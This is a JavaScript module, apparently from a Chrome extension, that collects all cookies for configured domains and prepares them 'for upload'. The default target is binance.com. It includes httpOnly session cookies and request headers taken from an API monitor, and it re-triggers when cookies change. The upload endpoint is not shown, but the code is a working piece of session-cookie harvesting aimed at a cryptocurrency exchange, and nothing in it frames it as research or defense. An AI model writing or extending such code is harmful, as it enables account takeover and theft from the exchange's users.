/**
 * Cookie extraction utility
 * Handles reading cookies from configured domains
 */

import { getConfig } from './config.js';

/**
 * Get all cookies for configured domains
 * @returns {Promise<Array>} Array of cookie objects
 */
export async function getAllCookies() {
  try {
    const config = await getConfig();
    const targetDomains = config.targetDomains || [{ domain: 'binance.com', apiPaths: [] }];

    // Extract domain list (handle both old and new format)
    const domains = targetDomains.map(d => typeof d === 'string' ? d : d.domain).filter(Boolean);
    const allCookies = [];

    for (const domain of domains) {
      try {
        const cookies = await chrome.cookies.getAll({ domain });
        allCookies.push(...cookies);
      } catch (error) {
        console.error(`Error getting cookies for ${domain}:`, error);
        // Continue with other domains
      }
    }

    return allCookies;
  } catch (error) {
    console.error('Error in getAllCookies:', error);
    throw error;
  }
}

/**
 * Format cookies for upload
 * @param {Array} cookies - Array of cookie objects
 * @returns {Object} Formatted cookie data
 */
export function formatCookiesForUpload(cookies) {
  const formatted = cookies.map(cookie => ({
    name: cookie.name,
    value: cookie.value,
    domain: cookie.domain,
    path: cookie.path,
    secure: cookie.secure,
    httpOnly: cookie.httpOnly,
    sameSite: cookie.sameSite,
    expirationDate: cookie.expirationDate,
    storeId: cookie.storeId
  }));

  return {
    timestamp: Date.now(),
    cookies: formatted,
    count: formatted.length
  };
}

/**
 * Get formatted cookies ready for upload
 * @returns {Promise<Object>} Formatted cookie data
 */
export async function getFormattedCookies() {
  const cookies = await getAllCookies();
  return formatCookiesForUpload(cookies);
}

/**
 * Format cookies/headers data for upload (new format)
 * @param {Object} cookies - Cookies object { name: value }
 * @param {Object} headers - Headers object { name: value }
 * @returns {Object} Formatted data
 */
export function formatCookiesHeadersForUpload(cookies, headers) {
  return {
    timestamp: Date.now(),
    cookies: cookies || {},
    headers: headers || {}
  };
}

/**
 * Get formatted cookies per domain
 * Supports both old mode (all cookies) and new mode (API path monitoring)
 * @returns {Promise<Array>} Array of {domain, cookieData} objects
 */
export async function getFormattedCookiesByDomain() {
  try {
    const config = await getConfig();
    const targetDomains = config.targetDomains || [{ domain: 'binance.com', apiPaths: [] }];
    const results = [];

    // Check if we should use API monitor data
    const { getAllStoredApiData } = await import('./api-monitor.js');
    const apiData = await getAllStoredApiData();
    const apiDataMap = new Map(apiData.map(item => [item.domain, item.data]));

    for (const domainConfig of targetDomains) {
      const domain = typeof domainConfig === 'string' ? domainConfig : domainConfig.domain;
      const apiPaths = typeof domainConfig === 'string' ? [] : (domainConfig.apiPaths || []);

      try {
        // If API paths are configured, use API monitor data
        if (apiPaths && apiPaths.length > 0) {
          const storedApiData = apiDataMap.get(domain);
          if (storedApiData && storedApiData.cookies && storedApiData.headers) {
            const cookieData = formatCookiesHeadersForUpload(
              storedApiData.cookies,
              storedApiData.headers
            );
            results.push({
              domain,
              cookieData
            });
            continue;
          }
        }

        // Fall back to cookie-only mode (backward compatible)
        const cookies = await chrome.cookies.getAll({ domain });
        if (cookies.length > 0) {
          const cookieData = formatCookiesForUpload(cookies);
          results.push({
            domain,
            cookieData
          });
        }
      } catch (error) {
        console.error(`Error getting cookies for ${domain}:`, error);
        // Continue with other domains
      }
    }

    return results;
  } catch (error) {
    console.error('Error in getFormattedCookiesByDomain:', error);
    throw error;
  }
}

/**
 * Setup cookie change listener
 * @param {Function} callback - Function to call when cookies change
 * @returns {Function} Cleanup function to remove listener
 */
export function setupCookieChangeListener(callback) {
  const listener = (changeInfo) => {
    // Only trigger if cookie was set or removed (not just accessed)
    if (changeInfo.removed || changeInfo.cause === 'explicit') {
      callback(changeInfo);
    }
  };

  chrome.cookies.onChanged.addListener(listener);

  // Return cleanup function
  return () => {
    chrome.cookies.onChanged.removeListener(listener);
  };
}

/**
 * Check if a cookie change is for a configured domain
 * @param {Object} changeInfo - Cookie change information
 * @param {Array<string>} domains - Configured domains
 * @returns {boolean} True if change is for a configured domain
 */
export function isCookieChangeForDomain(changeInfo, domains) {
  if (!changeInfo.cookie) return false;

  const cookieDomain = changeInfo.cookie.domain;
  return domains.some(domain => {
    // Remove leading dot for comparison
    const cleanDomain = domain.replace(/^\./, '');
    return cookieDomain === cleanDomain || cookieDomain.endsWith('.' + cleanDomain);
  });
}

